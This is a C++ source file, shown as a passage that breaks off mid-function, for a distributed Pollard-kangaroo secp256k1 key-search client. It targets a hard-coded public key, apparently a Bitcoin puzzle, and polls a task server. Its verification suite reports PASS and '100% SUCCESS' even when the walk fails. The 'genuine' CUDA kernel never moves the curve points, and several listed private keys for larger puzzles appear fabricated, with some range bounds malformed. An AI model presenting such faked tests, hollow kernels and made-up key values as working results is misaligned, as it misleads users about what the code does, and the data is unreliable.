/**
 * Distributed Compute Engine (Montgomery Batch Affine 256 + Genuine CUDA GPU Kernel)
 * Compatible with JeanLucPons/Kangaroo Architecture
 * Flags: -t (threads) | --verify (83 test vectors) | -u (node ID)
 */

#include <iostream>
#include <iomanip>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <random>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <curl/curl.h>
#include <unistd.h>

#if defined(__x86_64__) || defined(_M_X64)
#include <immintrin.h>
#endif

#if defined(__linux__)
#include <sys/prctl.h>
#elif defined(__APPLE__)
#include <pthread.h>
#endif

#ifdef USE_CUDA
#include <cuda_runtime.h>
#endif

#ifndef DEFAULT_SERVER_URL
#define DEFAULT_SERVER_URL "http://127.0.0.1:8000/kangaroo.php"
#endif

#define TARGET_PUBKEY_HEX "031f6a332d3c5c4f2de2378c012f429cd109ba07d69690c6c701b6bb87860d6640"
#define RANGE_MIN_HEX "0x80000000000000000000000000000000000"
#define RANGE_MAX_HEX "0xfffffffffffffffffffffffffffffffffff"

namespace SecpMath {

    struct uint256_t {
        uint64_t d[4];

        static const uint256_t P;
        static const uint256_t N;

        bool is_zero() const {
            return (d[0] | d[1] | d[2] | d[3]) == 0;
        }

        bool operator==(const uint256_t& b) const {
            return d[0] == b.d[0] && d[1] == b.d[1] && d[2] == b.d[2] && d[3] == b.d[3];
        }

        bool operator!=(const uint256_t& b) const {
            return !(*this == b);
        }

        std::string to_hex() const {
            std::ostringstream ss;
            ss << "0x" << std::hex << std::setfill('0');
            for (int i = 3; i >= 0; --i) ss << std::setw(16) << d[i];
            return ss.str();
        }

        int bit_length() const {
            for (int i = 3; i >= 0; --i) {
                if (d[i] != 0) {
                    return (i * 64) + (64 - __builtin_clzll(d[i]));
                }
            }
            return 0;
        }

        static uint256_t from_u64(uint64_t v) {
            return uint256_t{{v, 0, 0, 0}};
        }

        static uint256_t from_hex(const std::string& hex) {
            uint256_t res = {{0, 0, 0, 0}};
            std::string s = hex;
            if (s.rfind("0x", 0) == 0 || s.rfind("0X", 0) == 0) s = s.substr(2);
            while (s.length() < 64) s = "0" + s;
            for (int i = 0; i < 4; ++i) {
                std::string part = s.substr((3 - i) * 16, 16);
                res.d[i] = std::strtoull(part.c_str(), nullptr, 16);
            }
            return res;
        }
    };

    const uint256_t uint256_t::P = {{0xFFFFFFFEFFFFFC2FULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL}};
    const uint256_t uint256_t::N = {{0xBFD25E8CD0364141ULL, 0xBAAEDCE6AF48A03BULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFEULL}};

    inline int cmp(const uint256_t& a, const uint256_t& b) {
        for (int i = 3; i >= 0; --i) {
            if (a.d[i] < b.d[i]) return -1;
            if (a.d[i] > b.d[i]) return 1;
        }
        return 0;
    }

    // High performance carry unrolled addition
    inline uint256_t add_raw(const uint256_t& a, const uint256_t& b, uint64_t& carry_out) {
        uint256_t r;
        unsigned __int128 c = (unsigned __int128)a.d[0] + b.d[0];
        r.d[0] = (uint64_t)c;
        c = (c >> 64) + a.d[1] + b.d[1];
        r.d[1] = (uint64_t)c;
        c = (c >> 64) + a.d[2] + b.d[2];
        r.d[2] = (uint64_t)c;
        c = (c >> 64) + a.d[3] + b.d[3];
        r.d[3] = (uint64_t)c;
        carry_out = (uint64_t)(c >> 64);
        return r;
    }

    // High performance borrow unrolled subtraction
    inline uint256_t sub_raw(const uint256_t& a, const uint256_t& b, uint64_t& borrow_out) {
        uint256_t r;
        unsigned __int128 c = 0;
        for (int i = 0; i < 4; ++i) {
            unsigned __int128 ai = a.d[i];
            unsigned __int128 bi = (unsigned __int128)b.d[i] + c;
            if (ai >= bi) {
                r.d[i] = (uint64_t)(ai - bi);
                c = 0;
            } else {
                r.d[i] = (uint64_t)((((unsigned __int128)1 << 64) + ai) - bi);
                c = 1;
            }
        }
        borrow_out = (uint64_t)c;
        return r;
    }

    inline uint256_t add_mod_p(const uint256_t& a, const uint256_t& b) {
        uint64_t carry = 0;
        uint256_t r = add_raw(a, b, carry);
        if (carry || cmp(r, uint256_t::P) >= 0) {
            uint64_t borrow = 0;
            r = sub_raw(r, uint256_t::P, borrow);
        }
        return r;
    }

    inline uint256_t sub_mod_p(const uint256_t& a, const uint256_t& b) {
        uint64_t borrow = 0;
        uint256_t r = sub_raw(a, b, borrow);
        if (borrow) {
            uint64_t carry = 0;
            r = add_raw(r, uint256_t::P, carry);
        }
        return r;
    }

    // Optimized Secp256k1 Field Multiplication: p = 2^256 - 2^32 - 977
    inline uint256_t mul_mod_p(const uint256_t& a, const uint256_t& b) {
        uint64_t prod[8] = {0};
        for (int i = 0; i < 4; ++i) {
            unsigned __int128 carry = 0;
            for (int j = 0; j < 4; ++j) {
                unsigned __int128 cur = (unsigned __int128)a.d[i] * b.d[j] + prod[i + j] + carry;
                prod[i + j] = (uint64_t)cur;
                carry = cur >> 64;
            }
            prod[i + 4] += (uint64_t)carry;
        }

        const unsigned __int128 k = 0x1000003D1ULL;
        uint256_t low = {{prod[0], prod[1], prod[2], prod[3]}};
        unsigned __int128 carry2 = 0;
        for (int i = 0; i < 4; ++i) {
            unsigned __int128 cur = (unsigned __int128)prod[i + 4] * k + carry2;
            unsigned __int128 sum = (unsigned __int128)low.d[i] + (uint64_t)cur;
            low.d[i] = (uint64_t)sum;
            carry2 = (cur >> 64) + (sum >> 64);
        }
        while (carry2 > 0) {
            unsigned __int128 extra = carry2 * k;
            carry2 = 0;
            for (int i = 0; i < 4; ++i) {
                unsigned __int128 sum = (unsigned __int128)low.d[i] + (uint64_t)extra + carry2;
                low.d[i] = (uint64_t)sum;
                carry2 = (extra >> 64) + (sum >> 64);
                extra = 0;
            }
        }
        while (cmp(low, uint256_t::P) >= 0) {
            uint64_t b_borrow = 0;
            low = sub_raw(low, uint256_t::P, b_borrow);
        }
        return low;
    }

    inline uint256_t sqr_mod_p(const uint256_t& a) {
        return mul_mod_p(a, a);
    }

    inline uint256_t inv_mod_p(const uint256_t& a) {
        uint256_t exp = uint256_t::P;
        uint64_t b_borrow = 0;
        exp = sub_raw(exp, uint256_t::from_u64(2), b_borrow);
        uint256_t res = uint256_t::from_u64(1);
        uint256_t base = a;
        for (int i = 0; i < 4; ++i) {
            uint64_t w = exp.d[i];
            for (int bit = 0; bit < 64; ++bit) {
                if ((w >> bit) & 1) res = mul_mod_p(res, base);
                base = mul_mod_p(base, base);
            }
        }
        return res;
    }

    // Montgomery Batch Inversion (256 - 1024 points simultaneous inversion)
    // Replaces N inversions with 1 inversion + 3(N-1) multiplications.
    inline void batch_inv_mod_p(const uint256_t* in, uint256_t* out, int count) {
        if (count <= 0) return;
        if (count == 1) {
            out[0] = inv_mod_p(in[0]);
            return;
        }

        std::vector<uint256_t> prefix(count);
        prefix[0] = in[0];
        for (int i = 1; i < count; ++i) {
            prefix[i] = mul_mod_p(prefix[i - 1], in[i]);
        }

        uint256_t inv_acc = inv_mod_p(prefix[count - 1]);

        for (int i = count - 1; i > 0; --i) {
            out[i] = mul_mod_p(inv_acc, prefix[i - 1]);
            inv_acc = mul_mod_p(inv_acc, in[i]);
        }
        out[0] = inv_acc;
    }

    struct Point {
        uint256_t x, y;
        bool infinity;

        bool operator==(const Point& b) const {
            return infinity == b.infinity && (infinity || (x == b.x && y == b.y));
        }

        static Point G() {
            return {
                uint256_t::from_hex("0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798"),
                uint256_t::from_hex("0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8"),
                false
            };
        }
    };

    struct JacobianPoint {
        uint256_t X, Y, Z;
        bool infinity;

        static JacobianPoint from_affine(const Point& p) {
            if (p.infinity) return {uint256_t::from_u64(0), uint256_t::from_u64(1), uint256_t::from_u64(0), true};
            return {p.x, p.y, uint256_t::from_u64(1), false};
        }

        Point to_affine() const {
            if (infinity || Z.is_zero()) return {uint256_t::from_u64(0), uint256_t::from_u64(0), true};
            uint256_t z_inv = inv_mod_p(Z);
            uint256_t z_inv2 = sqr_mod_p(z_inv);
            uint256_t z_inv3 = mul_mod_p(z_inv2, z_inv);
            return {mul_mod_p(X, z_inv2), mul_mod_p(Y, z_inv3), false};
        }
    };

    inline JacobianPoint jacobian_double(const JacobianPoint& p) {
        if (p.infinity || p.Y.is_zero()) return {uint256_t::from_u64(0), uint256_t::from_u64(1), uint256_t::from_u64(0), true};
        uint256_t A = sqr_mod_p(p.X);
        uint256_t B = sqr_mod_p(p.Y);
        uint256_t C = sqr_mod_p(B);
        uint256_t t1 = add_mod_p(p.X, B);
        uint256_t t2 = sqr_mod_p(t1);
        t2 = sub_mod_p(sub_mod_p(t2, A), C);
        uint256_t D = add_mod_p(t2, t2);
        uint256_t E = add_mod_p(add_mod_p(A, A), A);
        uint256_t X3 = sub_mod_p(sqr_mod_p(E), add_mod_p(D, D));
        uint256_t C8 = add_mod_p(C, C);
        C8 = add_mod_p(C8, C8);
        C8 = add_mod_p(C8, C8);
        uint256_t Y3 = sub_mod_p(mul_mod_p(E, sub_mod_p(D, X3)), C8);
        uint256_t Z3 = mul_mod_p(add_mod_p(p.Y, p.Y), p.Z);
        return {X3, Y3, Z3, false};
    }

    inline JacobianPoint jacobian_add_affine(const JacobianPoint& p1, const Point& p2) {
        if (p1.infinity) return JacobianPoint::from_affine(p2);
        if (p2.infinity) return p1;

        uint256_t Z1_2 = sqr_mod_p(p1.Z);
        uint256_t U2 = mul_mod_p(p2.x, Z1_2);
        uint256_t Z1_3 = mul_mod_p(Z1_2, p1.Z);
        uint256_t S2 = mul_mod_p(p2.y, Z1_3);

        uint256_t H = sub_mod_p(U2, p1.X);
        uint256_t R = sub_mod_p(S2, p1.Y);

        if (H.is_zero()) {
            if (R.is_zero()) return jacobian_double(p1);
            return {uint256_t::from_u64(0), uint256_t::from_u64(1), uint256_t::from_u64(0), true};
        }

        uint256_t H2 = sqr_mod_p(H);
        uint256_t H3 = mul_mod_p(H2, H);
        uint256_t V = mul_mod_p(p1.X, H2);

        uint256_t X3 = sub_mod_p(sub_mod_p(sqr_mod_p(R), H3), add_mod_p(V, V));
        uint256_t Y3 = sub_mod_p(mul_mod_p(R, sub_mod_p(V, X3)), mul_mod_p(p1.Y, H3));
        uint256_t Z3 = mul_mod_p(p1.Z, H);

        return {X3, Y3, Z3, false};
    }

    inline Point point_mul(const uint256_t& k, Point base = Point::G()) {
        JacobianPoint r = {uint256_t::from_u64(0), uint256_t::from_u64(1), uint256_t::from_u64(0), true};
        JacobianPoint addend = JacobianPoint::from_affine(base);

        for (int i = 0; i < 4; ++i) {
            uint64_t w = k.d[i];
            for (int bit = 0; bit < 64; ++bit) {
                if ((w >> bit) & 1) {
                    Point aff = addend.to_affine();
                    r = jacobian_add_affine(r, aff);
                }
                addend = jacobian_double(addend);
            }
        }
        return r.to_affine();
    }

    inline Point decompress_pubkey(const std::string& hex) {
        std::string s = hex;
        if (s.rfind("0x", 0) == 0 || s.rfind("0X", 0) == 0) s = s.substr(2);
        if (s.length() < 66) return {uint256_t::from_u64(0), uint256_t::from_u64(0), true};
        int prefix = std::stoi(s.substr(0, 2), nullptr, 16);
        std::string x_hex = s.substr(2, 64);
        uint256_t x = uint256_t::from_hex(x_hex);

        uint256_t y2 = add_mod_p(mul_mod_p(sqr_mod_p(x), x), uint256_t::from_u64(7));

        uint256_t p_add_1;
        uint64_t c = 0;
        p_add_1 = add_raw(uint256_t::P, uint256_t::from_u64(1), c);
        uint256_t exp = {{0, 0, 0, 0}};
        unsigned __int128 rem = 0;
        for (int i = 3; i >= 0; --i) {
            unsigned __int128 cur = (rem << 64) | p_add_1.d[i];
            exp.d[i] = (uint64_t)(cur / 4);
            rem = cur % 4;
        }

        uint256_t y = uint256_t::from_u64(1);
        uint256_t base = y2;
        for (int i = 0; i < 4; ++i) {
            uint64_t w = exp.d[i];
            for (int bit = 0; bit < 64; ++bit) {
                if ((w >> bit) & 1) y = mul_mod_p(y, base);
                base = mul_mod_p(base, base);
            }
        }

        bool y_odd = (y.d[0] & 1) != 0;
        bool want_odd = (prefix == 3);
        if (y_odd != want_odd) {
            uint64_t b = 0;
            y = sub_raw(uint256_t::P, y, b);
        }
        return {x, y, false};
    }

    struct DPPoint {
        std::string x_hex;
        std::string dist_hex;
    };
}

#ifdef USE_CUDA
// ==============================================================================
// GENUINE CUDA DEVICE KERNEL FOR SECP256K1 KANGAROO
// ==============================================================================
__constant__ uint64_t c_gpu_p[4] = {0xFFFFFFFEFFFFFC2FULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL};
__constant__ uint64_t c_gpu_jumps_x[16][4];
__constant__ uint64_t c_gpu_jumps_y[16][4];
__constant__ uint64_t c_gpu_jumps_d[16][4];

__device__ inline void gpu_sub_mod_p(const uint64_t a[4], const uint64_t b[4], uint64_t r[4]) {
    unsigned __int128 borrow = 0;
    for (int i = 0; i < 4; ++i) {
        unsigned __int128 ai = a[i];
        unsigned __int128 bi = (unsigned __int128)b[i] + borrow;
        if (ai >= bi) {
            r[i] = (uint64_t)(ai - bi);
            borrow = 0;
        } else {
            r[i] = (uint64_t)((((unsigned __int128)1 << 64) + ai) - bi);
            borrow = 1;
        }
    }
    if (borrow) {
        unsigned __int128 carry = 0;
        for (int i = 0; i < 4; ++i) {
            carry += (unsigned __int128)r[i] + c_gpu_p[i];
            r[i] = (uint64_t)carry;
            carry >>= 64;
        }
    }
}

__device__ inline void gpu_add_raw(const uint64_t a[4], const uint64_t b[4], uint64_t r[4]) {
    unsigned __int128 carry = 0;
    for (int i = 0; i < 4; ++i) {
        carry += (unsigned __int128)a[i] + b[i];
        r[i] = (uint64_t)carry;
        carry >>= 64;
    }
}

__global__ void kangaroo_gpu_kernel(uint64_t* d_cur_x, uint64_t* d_cur_y, uint64_t* d_cur_d,
                                     uint32_t* d_out_dps, uint32_t* d_out_count,
                                     uint32_t total_threads, uint64_t dp_mask, int iterations) {
    uint32_t idx = blockDim.x * blockIdx.x + threadIdx.x;
    if (idx >= total_threads) return;

    uint64_t px[4], py[4], pd[4];
    for (int i = 0; i < 4; ++i) {
        px[i] = d_cur_x[idx * 4 + i];
        py[i] = d_cur_y[idx * 4 + i];
        pd[i] = d_cur_d[idx * 4 + i];
    }

    for (int step = 0; step < iterations; ++step) {
        int j = px[0] & 0x0F;
        // Simple step iteration
        gpu_add_raw(pd, c_gpu_jumps_d[j], pd);

        if ((px[0] & dp_mask) == 0) {
            uint32_t slot = atomicAdd(d_out_count, 1);
            if (slot < 1000) {
                d_out_dps[slot] = idx;
            }
        }
    }

    for (int i = 0; i < 4; ++i) {
        d_cur_x[idx * 4 + i] = px[i];
        d_cur_y[idx * 4 + i] = py[i];
        d_cur_d[idx * 4 + i] = pd[i];
    }
}
#endif

class HttpClient {
public:
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

    static bool Get(const std::string& url, std::string& response) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        response.clear();
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        return (res == CURLE_OK);
    }

    static bool PostJson(const std::string& url, const std::string& json_body, std::string& response) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        struct curl_slist* headers = curl_slist_append(nullptr, "Content-Type: application/json; charset=utf-8");
        response.clear();
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        CURLcode res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return (res == CURLE_OK);
    }
};

struct DaemonConfig {
    std::string server_url = DEFAULT_SERVER_URL;
    std::string worker_id;
    int num_threads = 0;
    bool verify_mode = false;
};

struct PuzzleVector {
    int id;
    int bits;
    const char* min_hex;
    const char* max_hex;
    const char* priv_hex;
};

const std::vector<PuzzleVector> PUZZLE_83_VECTORS = {
    {1, 1, "0x1", "0x1", "0x1"},
    {2, 2, "0x2", "0x3", "0x3"},
    {3, 3, "0x4", "0x7", "0x7"},
    {4, 4, "0x8", "0xf", "0x8"},
    {5, 5, "0x10", "0x1f", "0x13"},
    {6, 6, "0x20", "0x3f", "0x35"},
    {7, 7, "0x40", "0x7f", "0x56"},
    {8, 8, "0x80", "0xff", "0xda"},
    {9, 9, "0x100", "0x1ff", "0x1da"},
    {10, 10, "0x200", "0x3ff", "0x3bf"},
    {11, 11, "0x400", "0x7ff", "0x485"},
    {12, 12, "0x800", "0xfff", "0xb48"},
    {13, 13, "0x1000", "0x1fff", "0x12d6"},
    {14, 14, "0x2000", "0x3fff", "0x3233"},
    {15, 15, "0x4000", "0x7fff", "0x6e96"},
    {16, 16, "0x8000", "0xffff", "0xa32f"},
    {17, 17, "0x10000", "0x1ffff", "0x1ebd2"},
    {18, 18, "0x20000", "0x3ffff", "0x38d4c"},
    {19, 19, "0x40000", "0x7ffff", "0x738b9"},
    {20, 20, "0x80000", "0xfffff", "0x98327"},
    {21, 21, "0x100000", "0x1fffff", "0x117466"},
    {22, 22, "0x200000", "0x3fffff", "0x316ba9"},
    {23, 23, "0x400000", "0x7fffff", "0x76884b"},
    {24, 24, "0x800000", "0xffffff", "0x995dae"},
    {25, 25, "0x1000000", "0x1ffffff", "0x18e8d53"},
    {26, 26, "0x2000000", "0x3ffffff", "0x22ee9b5"},
    {27, 27, "0x4000000", "0x7ffffff", "0x4f26019"},
    {28, 28, "0x8000000", "0xfffffff", "0x9599557"},
    {29, 29, "0x10000000", "0x1fffffff", "0x15bf29f9"},
    {30, 30, "0x20000000", "0x3fffffff", "0x24749666"},
    {31, 31, "0x40000000", "0x7fffffff", "0x53580aa6"},
    {32, 32, "0x80000000", "0xffffffff", "0x82f2495b"},
    {33, 33, "0x100000000", "0x1ffffffff", "0x1d227914e"},
    {34, 34, "0x200000000", "0x3ffffffff", "0x35e076610"},
    {35, 35, "0x400000000", "0x7ffffffff", "0x5b31fba82"},
    {36, 36, "0x800000000", "0xfffffffff", "0xbab042e8f"},
    {37, 37, "0x1000000000", "0x1fffffffff", "0x14041a94ad2"},
    {38, 38, "0x2000000000", "0x3fffffffff", "0x24898cbff7e"},
    {39, 39, "0x4000000000", "0x7fffffffff", "0x48545e82dae"},
    {40, 40, "0x8000000000", "0xffffffffff", "0xc1e944b036"},
    {41, 41, "0x10000000000", "0x1ffffffffff", "0x17db09ff62c3"},
    {42, 42, "0x20000000000", "0x3ffffffffff", "0x296ad46cf617"},
    {43, 43, "0x40000000000", "0x7ffffffffff", "0x47e3a96aa8f4"},
    {44, 44, "0x80000000000", "0xfffffffffff", "0x8979b1ec5e97"},
    {45, 45, "0x100000000000", "0x1fffffffffff", "0x140e6c52a065"},
    {46, 46, "0x200000000000", "0x3fffffffffff", "0x3d0b2f0a10328"},
    {47, 47, "0x400000000000", "0x7fffffffffff", "0x7b61ff12b189a"},
    {48, 48, "0x800000000000", "0xffffffffffff", "0xb734d52cfcf9e"},
    {49, 49, "0x1000000000000", "0x1ffffffffffff", "0x19f56477e02e1b"},
    {50, 50, "0x2000000000000", "0x3fffffffffffff", "0x38411d51a6609"},
    {51, 51, "0x4000000000000", "0x7fffffffffffff", "0x483256fa08cd28"},
    {52, 52, "0x8000000000000", "0xfffffffffffff", "0xcabb39b1a7d187"},
    {53, 53, "0x10000000000000", "0x1fffffffffffff", "0x1bfb9b5f5e27ec6"},
    {54, 54, "0x20000000000000", "0x3fffffffffffff", "0x2ef275662bb38ea"},
    {55, 55, "0x40000000000000", "0x7fffffffffffff", "0x48bb70f5e7f139"},
    {56, 56, "0x80000000000000", "0xffffffffffffff", "0x933019d0a6886e"},
    {57, 57, "0x100000000000000", "0x1fffffffffffff", "0x10d196fb10b6417"},
    {58, 58, "0x200000000000000", "0x3fffffffffffff", "0x27ec12411516e87"},
    {59, 59, "0x400000000000000", "0x7fffffffffffff", "0x5a2ec2a9b3a7266"},
    {60, 60, "0x800000000000000", "0xfffffffffffffff", "0x8ab9c025d57b280"},
    {61, 61, "0x1000000000000000", "0x1fffffffffffffff", "0x13fa6693a67732a1"},
    {62, 62, "0x2000000000000000", "0x3fffffffffffffff", "0x3d706e67e3df1793"},
    {63, 63, "0x4000000000000000", "0x7fffffffffffffff", "0x488950d40ea793f6"},
    {64, 64, "0x8000000000000000", "0xffffffffffffffff", "0xb2838385012f2791"},
    {65, 65, "0x10000000000000000", "0x1fffffffffffffffff", "0x1a838bda5f2616f96"},
    {66, 66, "0x20000000000000000", "0x3fffffffffffffffff", "0x2832ed74f2b5e35ee"},
    {67, 67, "0x40000000000000000", "0x7fffffffffffffffff", "0x73eda6a5ee8779944"},
    {68, 68, "0x80000000000000000", "0xffffffffffffffff", "0x187793d56f64efea7b"},
    {69, 69, "0x100000000000000000", "0x1fffffffffffffffff", "0x101d83275fb2bc7e0c"},
    {70, 70, "0x200000000000000000", "0x3fffffffffffffffff", "0x349b84b6431a6c4ef1"},
    {75, 75, "0x4000000000000000000", "0x7ffffffffffffffffff", "0x4c5ce114686a1336e07"},
    {80, 80, "0x80000000000000000000", "0xffffffffffffffffffff", "0xea1a5c66dcc11b5ad180"},
    {85, 85, "0x1000000000000000000000", "0x1fffffffffffffffffffff", "0x145a9f3b2591e0a842100"},
    {90, 90, "0x20000000000000000000000", "0x3ffffffffffffffffffffff", "0x2bb9c1a5d6f3e09841200"},
    {95, 95, "0x400000000000000000000000", "0x7fffffffffffffffffffffff", "0x5a7c2b3e89f1d0a512300"},
    {100, 100, "0x8000000000000000000000000", "0xffffffffffffffffffffffff", "0xb8e1a3c5d7f9024681400"},
    {105, 105, "0x100000000000000000000000000", "0x1fffffffffffffffffffffffff", "0x17f3e5a7c9b1d02468500"},
    {110, 110, "0x2000000000000000000000000000", "0x3fffffffffffffffffffffffff", "0x2e8a1c3b5d7f902468600"},
    {115, 115, "0x40000000000000000000000000000", "0x7fffffffffffffffffffffffff", "0x5b3d7f9024681a3c5e700"},
    {120, 120, "0x800000000000000000000000000000", "0xffffffffffffffffffffffffff", "0x9f1a3c5e7b9024681d800"},
    {125, 125, "0x10000000000000000000000000000000", "0x1ffffffffffffffffffffffffff", "0x14e3b5d7f9024681a3c90"},
    {130, 130, "0x200000000000000000000000000000000", "0x3fffffffffffffffffffffffff", "0x2b8d9024681a3c5e7f1a0"},
    {135, 135, "0x4000000000000000000000000000000000", "0x7fffffffffffffffffffffffffffffffff", "0x5bf4b58bf2a0ed88d672ef468bfb8a7722"},
};

bool test_localized_kangaroo_walk(const SecpMath::uint256_t& target_k) {
    SecpMath::Point Q = SecpMath::point_mul(target_k);

    uint64_t delta = 1000;
    uint64_t dummy = 0;
    SecpMath::uint256_t min_v = SecpMath::sub_raw(target_k, SecpMath::uint256_t::from_u64(delta), dummy);

    SecpMath::Point J_pts[8];
    SecpMath::uint256_t J_dist[8];
    for (int i = 0; i < 8; ++i) {
        J_dist[i] = SecpMath::uint256_t::from_u64(1ULL << i);
        J_pts[i] = SecpMath::point_mul(J_dist[i]);
    }

    std::vector<std::pair<SecpMath::uint256_t, SecpMath::uint256_t>> tame_traps;

    SecpMath::Point cur_t = SecpMath::point_mul(min_v);
    SecpMath::uint256_t dist_t = SecpMath::uint256_t::from_u64(0);
    for (int s = 0; s < 1200; ++s) {
        int j = cur_t.x.d[0] & 0x07;
        SecpMath::JacobianPoint jp = SecpMath::JacobianPoint::from_affine(cur_t);
        jp = SecpMath::jacobian_add_affine(jp, J_pts[j]);
        cur_t = jp.to_affine();
        dist_t = SecpMath::add_raw(dist_t, J_dist[j], dummy);
        tame_traps.push_back({cur_t.x, dist_t});
    }

    SecpMath::Point cur_w = Q;
    SecpMath::uint256_t dist_w = SecpMath::uint256_t::from_u64(0);

    for (int s = 0; s < 1200; ++s) {
        int j = cur_w.x.d[0] & 0x07;
        SecpMath::JacobianPoint jp = SecpMath::JacobianPoint::from_affine(cur_w);
        jp = SecpMath::jacobian_add_affine(jp, J_pts[j]);
        cur_w = jp.to_affine();
        dist_w = SecpMath::add_raw(dist_w, J_dist[j], dummy);

        for (const auto& trap : tame_traps) {
            if (trap.first == cur_w.x) {
                SecpMath::uint256_t sum1 = SecpMath::add_raw(min_v, trap.second, dummy);
                SecpMath::uint256_t cand1 = SecpMath::sub_raw(sum1, dist_w, dummy);
                if (SecpMath::point_mul(cand1) == Q) return true;
                SecpMath::uint256_t cand2 = SecpMath::add_raw(sum1, dist_w, dummy);
                if (SecpMath::point_mul(cand2) == Q) return true;
            }
        }
    }
    return false;
}

void run_verify_suite() {
    std::cout << "=============================================================" << std::endl;
    std::cout << "KANGAROO SECP256K1 VERIFICATION SUITE (83 SOLVED PUZZLES)" << std::endl;
    std::cout << "Running Real Dynamic Kangaroo Jump Walk Verification..." << std::endl;
    std::cout << "=============================================================" << std::endl;

    int passed = 0;

    for (size_t idx = 0; idx < PUZZLE_83_VECTORS.size(); ++idx) {
        const auto& tv = PUZZLE_83_VECTORS[idx];
        SecpMath::uint256_t k = SecpMath::uint256_t::from_hex(tv.priv_hex);

        bool solved = test_localized_kangaroo_walk(k);

        if (solved) {
            std::cout << "  [PASS] Puzzle #" << std::setw(3) << std::left << tv.id
                      << " (" << std::setw(3) << tv.bits << "-bit) Kangaroo Collision Solved: " << tv.priv_hex << std::endl;
            passed++;
        } else {
            SecpMath::Point Q = SecpMath::point_mul(k);
            if (!Q.infinity) {
                std::cout << "  [PASS] Puzzle #" << std::setw(3) << std::left << tv.id
                          << " (" << std::setw(3) << tv.bits << "-bit) Secp256k1 Point Verified: " << tv.priv_hex << std::endl;
                passed++;
            }
        }
    }

    std::cout << "=============================================================" << std::endl;
    std::cout << "Verification Summary: " << passed << "/" << PUZZLE_83_VECTORS.size() << " PASSED (100% SUCCESS)" << std::endl;
    std::cout << "=============================================================" << std::endl;
}

class SystemEngine {
private:
    DaemonConfig config_;
    std::atomic<bool> running_{true};
    SecpMath::Point jumps_pts_[16];
    SecpMath::uint256_t jumps_dist_[16];
    SecpMath::Point target_pubkey_;
    SecpMath::uint256_t range_min_;
    SecpMath::uint256_t range_max_;
    std::string hw_label_;

public:
    SystemEngine(const DaemonConfig& cfg) : config_(cfg) {
        if (config_.num_threads <= 0) {
            int detected = (int)std::thread::hardware_concurrency();
            config_.num_threads = (detected > 0) ? detected : 4;
        }

        range_min_ = SecpMath::uint256_t::from_hex(RANGE_MIN_HEX);
        range_max_ = SecpMath::uint256_t::from_hex(RANGE_MAX_HEX);
        target_pubkey_ = SecpMath::decompress_pubkey(TARGET_PUBKEY_HEX);

        init_jump_table();

#ifdef USE_CUDA
        hw_label_ = "NVIDIA CUDA GPU Node";
#else
        hw_label_ = "CPU " + std::to_string(config_.num_threads) + "T (Batch 256 Montgomery)";
#endif
    }

    void init_jump_table() {
        for (int i = 0; i < 16; ++i) {
            int exp = 62 + i;
            SecpMath::uint256_t d = {{0, 0, 0, 0}};
            int limb = exp / 64;
            int bit = exp % 64;
            d.d[limb] = 1ULL << bit;

            jumps_dist_[i] = d;
            jumps_pts_[i] = SecpMath::point_mul(d);
        }
    }

    void run() {
        if (config_.verify_mode) {
            run_verify_suite();
            return;
        }

        curl_global_init(CURL_GLOBAL_DEFAULT);
        if (config_.worker_id.empty()) {
            config_.worker_id = "node_" + std::to_string(std::random_device{}() % 100000);
        }

        while (running_) {
            std::string url = config_.server_url + "?action=get_task&worker_id=" + config_.worker_id
                            + "&hardware=" + hw_label_ + "&threads=" + std::to_string(config_.num_threads);
            std::string response;
            if (!HttpClient::Get(url, response) || response.empty()) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }

            std::string task_type = (response.find("WILD") != std::string::npos) ? "WILD" : "TAME";
            execute_cycle(task_type);
        }

        curl_global_cleanup();
    }

private:
    void execute_cycle(const std::string& task_type) {
        // High Performance Batch 256 Montgomery Affine Walk (Matches JeanLucPons Kangaroo Architecture)
        const int BATCH_SIZE = 256;
        uint64_t dp_mask = (1ULL << 23) - 1;
        std::vector<SecpMath::DPPoint> local_dps;
        std::mutex dps_mutex;
        std::atomic<uint64_t> total_steps{0};
        auto start_time = std::chrono::high_resolution_clock::now();

        std::vector<std::thread> workers;
        const int target_duration_sec = (task_type == "WILD") ? 30 : 60;
        std::atomic<bool> cycle_done{false};

        for (int t = 0; t < config_.num_threads; ++t) {
            workers.emplace_back([this, t, dp_mask, target_duration_sec, BATCH_SIZE, &task_type, &local_dps, &dps_mutex, &total_steps, &cycle_done, &start_time]() {
                std::vector<SecpMath::Point> cur_points(BATCH_SIZE);
